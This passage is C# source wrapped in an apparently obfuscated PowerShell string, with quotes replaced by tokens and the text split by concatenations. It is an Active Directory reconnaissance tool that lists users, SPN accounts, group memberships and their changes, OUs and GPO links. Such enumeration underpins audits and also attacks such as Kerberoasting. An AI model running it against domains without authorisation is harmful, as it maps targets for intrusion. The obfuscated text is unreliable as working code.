                    UserObj.Members.Add(new PSNoteProperty(I2ajLogon WorkstationsI2aj, AdUser.Members[I2ajLogonWorkstationsI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajAdminCountI2aj, AdUser.Members[I2ajAdminCountI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPrimary GroupIDI2aj, AdUser.Members[I2ajprimaryGroupIDI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajSIDI2aj, AdUser.Members[I2ajSIDI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajSIDHistoryI2aj, SIDHistory));
       '+'             UserObj.Members.Add(new PSNoteProperty(I2ajHasSPNI2aj, HasSPN));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDescriptionI2aj, CleanString(AdUser.Members[I2ajDescriptionI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajTitleI2aj, CleanString(AdUser.Members[I2ajTitleI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDepartmentI2aj, CleanString(AdUser.Members[I2ajDepartmentI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajCompanyI2aj, CleanString(AdUser.Members[I2ajCompanyI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajManagerI2aj, CleanString(AdUser.Members[I2ajManagerI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajInfoI2aj, CleanString(AdUser.Members[I2ajInfoI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajLast Logon DateI2aj, LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPassword LastSetI2aj, PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty(I2ajAccount Expirat'+'ion DateI2aj, AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty(I2ajAccount Expiration (days)I2aj, AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty(I2ajMobileI2aj, CleanString(AdUser.Members[I2ajMobileI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajEmailI2aj, CleanString(AdUser.Members[I2ajmailI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajHomeDirectoryI2aj, AdUser.Members[I2ajhomeDirectoryI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajProfilePathI2aj, AdUser.Members[I2ajprofilePathI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajScriptPathI2aj, AdUser.Members[I2ajScriptPathI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajUserAccountControlI2aj, AdUser.Members[I2ajUserAccountControlI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajFirst NameI2aj, CleanString(AdUser.Members[I2ajgivenNameI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajMiddle NameI2aj, CleanString(AdUser.Members[I2ajmiddleNameI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajLast NameI2aj, CleanString(AdUser.Members[I2ajsnI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajCountryI2aj, CleanString(AdUser.Members[I2ajcI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdUser.Members[I2ajwhenCreatedI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdUser.Members[I2ajwhenChangedI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, CleanString(AdUser.Members[I2ajDistinguishedNameI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajCanonicalNameI2aj, CleanString(AdUser.Members[I2ajCanonicalNameI2aj].Value)));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members[I2ajservicePrincipalNameI2aj].Value;
                    if (SPNs.Value == null)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = '+'null;
                    DateTime? PasswordLastSet = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Members[I2ajuserAccountControlI2aj].Value != null)
                    {
                        var userFlags = (UACFlags) AdUser.Members[I2ajuserAccountControlI2aj].Value;
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    if (Convert.ToString(AdUser.Members[I2ajpwdLastSetI2aj].Value) != I2aj0I2aj)
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)AdUser.Members[I2ajpwdLastSetI2aj].Value);
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberOfAttribute = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members[I2ajmemberofI2aj].Value;
                    if (MemberOfAttribute.Value != null)
                    {
                        foreach (string Member in MemberOfAttribute)
                        {
                            Memberof = Memberof + I2aj,I2aj + ((Convert.ToString(Member)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                        }
                        Memberof = Memberof.TrimStart(JQTOy,JQTOy);
                    }
                    string Description = CleanString(AdUser.Members[I2ajDescriptionI2aj].Value);
                    string PrimaryGroupID = Convert.ToString(AdUser.Members[I2ajprimaryGroupIDI2aj].Value);
                    foreach (string SPN in SPNs)
                    {
                        string[] SPNArray = SPN.Split(JQTOy/JQTOy);
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajUsernameI2aj, CleanString(AdUser.Members[I2ajSamAccountNameI2aj].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, CleanString(AdUser.Members[I2ajNameI2aj].Value)));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajEnabledI2aj, Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajServiceI2aj, SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajHostI2aj, SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajPassword Last SetI2aj, PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajDescriptionI2aj, Description));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajPrimary GroupIDI2aj, PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty(I2ajMemberofI2aj, Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
             '+'   }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string ManagedByValue = Convert.ToString(AdGroup.Members[I2ajmanagedByI2aj].Value);
                    string ManagedBy = I2ajI2aj;
                    string SIDHistory = I2ajI2aj;

                    if (AdGroup.Members[I2ajmanagedByI2aj].Value != null)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { I2ajCN=I2aj },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { I2ajOU=I2aj'+' },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(JQTOy,JQTOy);
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members[I2ajSIDHistoryI2aj].Value;
                    string sids = I2ajI2aj;
                    foreach (var value in history)
                    {
                        sids = sids + I2aj,I2aj + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(JQTOy,JQTOy);

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdGroup.Members[I2ajSamAccountNameI2aj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajAdminCountI2aj, AdGroup.Members[I2ajAdminCountI2aj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajGroupCategoryI2aj, AdGroup.Members[I2ajGroupCategoryI2aj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajGroupScopeI2aj, AdGroup.Members[I2ajGroupScopeI2aj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajManagedByI2aj, ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajSIDI2aj, AdGroup.Members[I2ajsidI2aj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajSIDHistoryI2aj, SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajDescriptionI2aj, CleanString(AdGroup.Members[I2ajDescriptionI2aj].Value)));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdGroup.Members[I2ajwhenCreatedI2aj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdGroup.Members[I2ajwhenChangedI2aj].Value));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, CleanString(AdGroup.Members[I2ajDistinguishedN'+'ameI2aj].Value)));
                    GroupObj.Members.Add(new PSNoteProperty(I2ajCanonicalNameI2aj, AdGroup.Members[I2ajCanonicalNameI2aj].Value));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
  '+'          public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection ReplValueMetaData = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members[I2ajmsDS-ReplValueMetaDataI2aj].Value;

                    if (ReplValueMetaData.Value != null)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace(I2ajCOlhgx00I2aj, I2ajI2aj).Replace(I2aj&I2aj,I2aj&amp;I2aj));

                            if (ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeDeletedI2aj].InnerText != I2aj1601-01-01T00:00:00ZI2aj)
                            {
                                Action = I2ajRemovedI2aj;
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeCreatedI2aj].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeDeletedI2aj].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = I2ajAddedI2aj;
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeCreatedI2aj].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject '+'GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, AdGroup.Members[I2ajSamAccountNameI2aj].Value));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajGroup DistinguishedNameI2aj, CleanString(AdGroup.Members[I2ajDistinguishedNameI2aj].Value)));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajMember DistinguishedNameI2aj, CleanString(ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajpszObjectDnI2aj].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajActionI2aj, Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajAdded Age (Days)I2aj, DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajRemoved Age (Days)I2aj, DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajAdded DateI2aj, AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajRemoved DateI2aj, RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajftimeCreatedI2aj, ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeCreatedI2aj].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty(I2ajftimeDeletedI2aj, ReplXML.SelectSingleNode(I2ajDS_REPL_VALUE_META_DATAI2aj)[I2ajftimeDeletedI2aj].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajExcepti'+'on caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    ADWSClass.AdGroupDictionary.Add((Convert.ToString(AdGroup.Properties[I2ajSIDI2aj].Value)), (Convert.ToString(AdGroup.Members[I2ajSamAccountNameI2aj].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // based on https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    PSObject AdGroup = (PSObject) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = Convert.ToString(AdGroup.Members[I2ajsamaccounttypeI2aj].Value);
                    string ObjectClass = Convert.ToString(AdGroup.Members[I2ajObjectClassI2aj].Value);
                    string AccountType = I2ajI2aj;
                    string GroupName = I2ajI2aj;
                    string MemberUserName = I2aj-I2aj;
                    string MemberName = I2ajI2aj;
                    string PrimaryGroupID = I2ajI2aj;
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == I2ajforeignSecurityPrincipalI2aj)
                    {
                        Acco'+'untType = I2ajforeignSecurityPrincipalI2aj;
                        MemberUserName = ((Convert.ToString(AdGroup.Members[I2ajDistinguishedNameI2aj].Value)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                        MemberName = null;
                        Microsoft.A'+'ctiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members[I2ajmemberofI2aj].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = I2ajgroupI2aj;
                        MemberName = ((Convert.ToString(AdGroup.Members[I2ajDistinguishedNameI2aj].Value)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members[I2ajmemberofI2aj].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = I2ajuserI2aj;
                        MemberName = ((Convert.ToString(AdGroup.Members[I2ajDistinguishedNameI2aj].Value)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                        MemberUserName = Convert.ToString(AdGroup.Members[I2ajsAMAccountNameI2aj].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members[I2ajprimaryGroupIDI2aj].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + I2aj-I2aj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(I2ajException caught: {0}I2aj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members[I2ajmemberofI2aj].Value;
                        if (MemberGroups.Value != null)
                        {
                            foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
'+'                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = I2ajcomputerI2aj;
                        MemberName = ((Convert.ToString(AdGroup.Members[I2ajDistinguishedNameI2aj].Value)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                        MemberUserName = Convert.ToString(AdGroup.Members[I2ajsAMAccountNameI2aj].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members[I2ajprimaryGroupIDI2aj].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + I2aj-I2aj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(I2ajException caught: {0}I2aj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, M'+'emberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                        GroupsList.Add( GroupMemberObj );

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members[I2ajmemberofI2aj].Value;
                        if (MemberGroups.Value != null)
                        {
             '+'               foreach (string GroupMember in MemberGroups)
                            {
                                GroupName = ((Convert.ToString(GroupMember)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                                GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = I2ajtrustI2aj;
                        MemberName = ((Convert.ToString(AdGroup.Members[I2ajDistinguishedNameI2aj].Value)).Split(JQTOy,JQTOy)[0]).Split(JQTOy=JQTOy)[1];
                        MemberUserName = Convert.ToString(AdGroup.Members[I2ajsAMAccountNameI2aj].Value);
                        PrimaryGroupID = Convert.ToString(AdGroup.Members[I2ajprimaryGroupIDI2aj].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + I2aj-I2aj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(I2ajException caught: {0}I2aj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajGroup NameI2aj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember UserNameI2aj, MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajMember NameI2aj, MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(I2ajAccountTypeI2aj, AccountType));
       '+'                 GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
    '+'            try
                {
                    PSObject AdOU = (PSObject) record;
                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdOU.Members[I2ajNameI2aj].Value));
                    OUObj.Members.Add(new PSNoteProperty(I2ajDepthI2aj, ((Convert.ToString(AdOU.Members[I2ajDistinguishedNameI2aj].Value).Split(new string[] { I2ajOU=I2aj }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty(I2ajDescriptionI2aj, AdOU.Members[I2ajDescriptionI2aj].Value));
           '+'         OUObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdOU.Members[I2ajwhenCreatedI2aj].Value));
                    OUObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdOU.Members[I2ajwhenChangedI2aj].Value));
                    OUObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, AdOU.Members[I2ajDistinguishedNameI2aj].Value));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty(I2ajDisplayNameI2aj, CleanString(AdGPO.Members[I2ajDisplayNameI2aj].Value)));
                    GPOObj.Members.Add(new PSNoteProperty(I2ajGUIDI2aj, CleanString(AdGPO.Members[I2ajNameI2aj].Value)));
                    GPOObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdGPO.Members[I2ajwhenCreatedI2aj].Value));
                    GPOObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdGPO.Members[I2ajwhenChangedI2aj].Value));
                    GPOObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, CleanString(AdGPO.Members[I2ajDistinguishedNameI2aj].Value)));
                    GPOObj.Members.Add(new PSNoteProperty(I2ajFilePathI2aj, AdGPO.Members[I2ajgPCFileSysPathI2aj].Value));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
'+'                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;
                    ADWSClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Members[I2ajDistinguishedNameI2aj].Value).ToUpper()), (Convert.ToString(AdGPO.Members[I2ajDisplayNameI2aj].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSOM = (PSObject) record;
                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = Convert.ToString(AdSOM.Members[I2ajgPLinkI2aj].Value);
                    string GPOName = null;

                    Depth = (Convert.ToString(AdSOM.Members[I2ajDistinguishedNameI2aj].Value).Split(new string[] { I2ajOU=I2aj }, StringSplitOptions.None)).Length -1;
                    if (AdSOM.Members[I2ajgPOptionsI2aj].Value != null && (int) AdSOM.Members[I2ajgPOptionsI2aj].Value == 1)
                    {
                        BlockInheritance = true;
                    }
                    var GPLinks = gPLink.Split(JQTOy]JQTOy, JQTOy[JQTOy).Where(x => x.StartsWith(I2ajLDAPI2aj));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {'+'
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdSOM.Members[I2ajNameI2aj].Value));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajDepthI2aj, Depth));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, AdSOM.Members[I2ajDistinguishedNameI2aj].Value));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajLink OrderI2aj, null));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajGPOI2aj, GPOName));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajEnforcedI2aj, Enforced));
                        SOMObj.Members.Add(new PSNot'+'eProperty(I2ajLink EnabledI2aj, LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajBlockInheritanceI2aj, BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajgPLinkI2aj, gPLink));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajgPOptionsI2aj, AdSOM.Members[I2ajgPOptionsI2aj].Value));
                        SOMsList.Add( SOMObj );
        '+'            }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split(JQTOy/JQTOy, JQTOy;JQTOy);
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = ADWSClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? ADWSClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split(JQTOy=JQTOy,JQTOy,JQTOy)[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdSOM.Members[I2ajNameI2aj].Value));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajDepthI2aj, Depth));
                        SOMObj.Members.Add(new PSNoteProp'+'erty(I2ajDistinguishedNameI2aj, AdSOM.Members[I2ajD'+'istinguishedNameI2aj].Value));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajLink OrderI2aj, Order));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajGPOI2aj, GPOName));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajEnforcedI2aj, Enforced));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajLink EnabledI2aj, LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajBlockInheritanceI2aj, BlockInheritance));
                 '+'       SOMObj.Members.Add(new PSNoteProperty(I2ajgPLinkI2aj, gPLink));
                        SOMObj.Members.Add(new PSNoteProperty(I2ajgPOptionsI2aj, AdSOM.Members[I2ajgPOptionsI2aj].Value));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
  '+'                  return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdPrinter = (PSObject) record;

